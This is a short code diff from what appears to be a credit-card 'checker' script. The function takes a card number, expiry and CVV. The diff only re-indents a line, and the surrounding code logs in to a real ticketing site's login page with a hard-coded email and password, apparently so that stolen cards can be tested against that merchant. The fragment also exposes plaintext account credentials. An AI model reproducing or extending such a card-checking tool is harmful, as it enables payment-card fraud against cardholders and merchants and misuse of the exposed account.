@@ -99,7 +99,7 @@ def checker(card, month, year, cvv):
             
             if len(year) == 4:
                 year = year[2:]
-                        url = "https://www.brownpapertickets.com/login.html"
+            url = "https://www.brownpapertickets.com/login.html"
             payload = 'return_url=&login_fNhxLQgVEb=jacaccbot%40gmail.com&pass_uqKxazCZ9B=radask10'
             headers = {
                 'Host': 'www.brownpapertickets.com',
